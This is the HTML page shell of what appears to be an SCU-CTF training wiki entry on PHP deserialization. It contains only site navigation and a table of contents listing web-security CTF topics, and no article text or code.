



<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.0">
    
    
      
        <title>PHP反序列化 - SCU-CTF HomePage</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.982221ab.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.224b79ff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.01ccdecf.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro">
        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#php" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../../.." title="SCU-CTF HomePage" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              SCU-CTF HomePage
            </span>
            <span class="md-header-nav__topic">
              PHP反序列化
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    GitHub
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href="../../../.." title="Introduction" class="md-tabs__link">
        Introduction
      </a>
    
  </li>

      
        
  
  
    
    
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../JWT/JWT简要介绍/" title="CTFWiki" class="md-tabs__link">
          CTFWiki
        </a>
      
    </li>
  

  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../WriteUp/2018/Web/" title="WriteUp" class="md-tabs__link">
          WriteUp
        </a>
      
    </li>
  

  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../../比赛信息/" title="比赛信息" class="md-tabs__link">
          比赛信息
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../../.." title="SCU-CTF HomePage" class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </a>
    SCU-CTF HomePage
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../../.." title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      CTFWiki
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        CTFWiki
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
    
    <label class="md-nav__link" for="nav-2-1">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-1">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1">
    
    <label class="md-nav__link" for="nav-2-1-1">
      JWT
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-1">
        JWT
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/JWT简要介绍/" title="JWT简要介绍" class="md-nav__link">
      JWT简要介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/一个简单的无加密题目/" title="一个简单的无加密题目" class="md-nav__link">
      一个简单的无加密题目
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/公私钥泄露/" title="公私钥泄露" class="md-nav__link">
      公私钥泄露
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/密钥弱口令/" title="密钥弱口令" class="md-nav__link">
      密钥弱口令
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/密钥混淆攻击/" title="密钥混淆攻击" class="md-nav__link">
      密钥混淆攻击
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/爆破密钥/" title="爆破密钥" class="md-nav__link">
      爆破密钥
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../JWT/签名算法可被修改为none/" title="签名算法可被修改为none" class="md-nav__link">
      签名算法可被修改为none
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-2" type="checkbox" id="nav-2-1-2">
    
    <label class="md-nav__link" for="nav-2-1-2">
      SQLI
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-2">
        SQLI
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/MySQL字符串函数详解/" title="MySQL字符串函数详解" class="md-nav__link">
      MySQL字符串函数详解
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/mysql慢查询日志getshell/" title="原理" class="md-nav__link">
      原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/mysql注入绕过技巧/" title="mysql注入绕过技巧" class="md-nav__link">
      mysql注入绕过技巧
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/中转注入/" title="SQL注入技巧-配合Python-Flask的中转注入" class="md-nav__link">
      SQL注入技巧-配合Python-Flask的中转注入
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/过滤concat/" title="过滤concat" class="md-nav__link">
      过滤concat
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SQLI/过滤逗号/" title="过滤逗号" class="md-nav__link">
      过滤逗号
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-3" type="checkbox" id="nav-2-1-3">
    
    <label class="md-nav__link" for="nav-2-1-3">
      SSRF
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-3">
        SSRF
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../SSRF/CTFSHOW-SSRF-WP/" title="例题分析" class="md-nav__link">
      例题分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../SSRF/SSRF简要介绍/" title="SSRF介绍" class="md-nav__link">
      SSRF介绍
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-4" type="checkbox" id="nav-2-1-4" checked>
    
    <label class="md-nav__link" for="nav-2-1-4">
      Unserialize
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-4">
        Unserialize
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        PHP反序列化
      </label>
    
    <a href="./" title="PHP反序列化" class="md-nav__link md-nav__link--active">
      PHP反序列化
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="简介" class="md-nav__link">
    简介
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="常见的序列化格式" class="md-nav__link">
    常见的序列化格式
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="案例引入" class="md-nav__link">
    案例引入
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="反序列化中常见的魔术方法" class="md-nav__link">
    反序列化中常见的魔术方法
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#trick" title="反序列化绕过小Trick" class="md-nav__link">
    反序列化绕过小Trick
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php71" title="php7.1+反序列化对类属性不敏感" class="md-nav__link">
    php7.1+反序列化对类属性不敏感
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#__wakeupcve-2016-7124" title="绕过__wakeup(CVE-2016-7124)" class="md-nav__link">
    绕过__wakeup(CVE-2016-7124)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过部分正则" class="md-nav__link">
    绕过部分正则
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="利用引用" class="md-nav__link">
    利用引用
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#16" title="16进制绕过字符的过滤" class="md-nav__link">
    16进制绕过字符的过滤
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php_1" title="PHP反序列化字符逃逸" class="md-nav__link">
    PHP反序列化字符逃逸
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="情况1：过滤后字符变多" class="md-nav__link">
    情况1：过滤后字符变多
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2" title="情况2：过滤后字符变少" class="md-nav__link">
    情况2：过滤后字符变少
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" title="对象注入" class="md-nav__link">
    对象注入
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pop" title="POP链的构造利用" class="md-nav__link">
    POP链的构造利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pop_1" title="POP链简单介绍" class="md-nav__link">
    POP链简单介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="简单案例讲解" class="md-nav__link">
    简单案例讲解
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php_2" title="PHP原生类反序列化利用" class="md-nav__link">
    PHP原生类反序列化利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#soapclient" title="SoapClient介绍" class="md-nav__link">
    SoapClient介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="利用方式" class="md-nav__link">
    利用方式
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="实战" class="md-nav__link">
    实战
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phar" title="Phar反序列化" class="md-nav__link">
    Phar反序列化
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phar_1" title="什么是phar文件" class="md-nav__link">
    什么是phar文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phar_2" title="phar文件的结构" class="md-nav__link">
    phar文件的结构
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="漏洞利用条件" class="md-nav__link">
    漏洞利用条件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="受影响的函数" class="md-nav__link">
    受影响的函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="绕过方式" class="md-nav__link">
    绕过方式
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-session" title="php-session反序列化" class="md-nav__link">
    php-session反序列化
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#session" title="session简单介绍" class="md-nav__link">
    session简单介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#session_1" title="session 的存储机制" class="md-nav__link">
    session 的存储机制
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phpinisession" title="php.ini中一些session配置" class="md-nav__link">
    php.ini中一些session配置
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="利用姿势" class="md-nav__link">
    利用姿势
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sessionupload_progress" title="session.upload_progress进行文件包含和反序列化渗透" class="md-nav__link">
    session.upload_progress进行文件包含和反序列化渗透
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#session_2" title="使用不同的引擎来处理session文件" class="md-nav__link">
    使用不同的引擎来处理session文件
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_session" title="$_SESSION变量直接可控" class="md-nav__link">
    $_SESSION变量直接可控
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_session_1" title="$_SESSION变量直接不可控" class="md-nav__link">
    $_SESSION变量直接不可控
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-5" type="checkbox" id="nav-2-1-5">
    
    <label class="md-nav__link" for="nav-2-1-5">
      XXE
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-5">
        XXE
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../XXE/XXE/" title="XXE" class="md-nav__link">
      XXE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../XXE/无回显/" title="XXE解决无回显" class="md-nav__link">
      XXE解决无回显
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../XXE/编码绕过/" title="XXE介绍与绕过" class="md-nav__link">
      XXE介绍与绕过
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-6" type="checkbox" id="nav-2-1-6">
    
    <label class="md-nav__link" for="nav-2-1-6">
      安全研究
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-6">
        安全研究
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../安全研究/PDO的ATTR_EMULATE_PREPARES属性带来的安全问题/" title="PDO的ATTR EMULATE PREPARES属性带来的安全问题" class="md-nav__link">
      PDO的ATTR EMULATE PREPARES属性带来的安全问题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7" type="checkbox" id="nav-2-1-7">
    
    <label class="md-nav__link" for="nav-2-1-7">
      编程语言
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-7">
        编程语言
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-1" type="checkbox" id="nav-2-1-7-1">
    
    <label class="md-nav__link" for="nav-2-1-7-1">
      Java
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-2-1-7-1">
        Java
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-1-1" type="checkbox" id="nav-2-1-7-1-1">
    
    <label class="md-nav__link" for="nav-2-1-7-1-1">
      Fastjson
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="5">
      <label class="md-nav__title" for="nav-2-1-7-1-1">
        Fastjson
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/Java/fastjson/fastjson/" title="Fastjson" class="md-nav__link">
      Fastjson
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-2" type="checkbox" id="nav-2-1-7-2">
    
    <label class="md-nav__link" for="nav-2-1-7-2">
      Nodejs
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-2-1-7-2">
        Nodejs
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/nodejs/nodejs/" title="Nodejs" class="md-nav__link">
      Nodejs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-2-2" type="checkbox" id="nav-2-1-7-2-2">
    
    <label class="md-nav__link" for="nav-2-1-7-2-2">
      Nodejs沙盒逃逸
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="5">
      <label class="md-nav__title" for="nav-2-1-7-2-2">
        Nodejs沙盒逃逸
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/nodejs/nodejs沙盒逃逸/readme/" title="NodeJs沙盒逃逸分析及原型链的简单学习" class="md-nav__link">
      NodeJs沙盒逃逸分析及原型链的简单学习
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-2-3" type="checkbox" id="nav-2-1-7-2-3">
    
    <label class="md-nav__link" for="nav-2-1-7-2-3">
      原型链污染攻击
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="5">
      <label class="md-nav__title" for="nav-2-1-7-2-3">
        原型链污染攻击
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/nodejs/原型链污染攻击/CTFSHOW-PrototypePollutionAttack/" title="原型链污染攻击" class="md-nav__link">
      原型链污染攻击
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-3" type="checkbox" id="nav-2-1-7-3">
    
    <label class="md-nav__link" for="nav-2-1-7-3">
      Php
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-2-1-7-3">
        Php
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/php/php小tricks/" title="函数Tricks" class="md-nav__link">
      函数Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-7-4" type="checkbox" id="nav-2-1-7-4">
    
    <label class="md-nav__link" for="nav-2-1-7-4">
      Python
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-2-1-7-4">
        Python
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../编程语言/python/" title="Index" class="md-nav__link">
      Index
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      WriteUp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        WriteUp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-1" type="checkbox" id="nav-3-1">
    
    <label class="md-nav__link" for="nav-3-1">
      2018
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-1">
        2018
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/2018/Web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      201905
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        201905
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/201905/Crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/201905/Misc/" title="MISC" class="md-nav__link">
      MISC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/201905/Pwn/" title="PWN" class="md-nav__link">
      PWN
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/201905/Reverse/" title="REVERSE" class="md-nav__link">
      REVERSE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/201905/Web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      202005
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        202005
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/202005/Misc/" title="Misc" class="md-nav__link">
      Misc
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/202005/Reverse/" title="Reverse" class="md-nav__link">
      Reverse
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/202005/Web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../WriteUp/202005/pwn/" title="Pwn" class="md-nav__link">
      Pwn
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      比赛信息
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        比赛信息
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../比赛信息/" title="比赛信息发布" class="md-nav__link">
      比赛信息发布
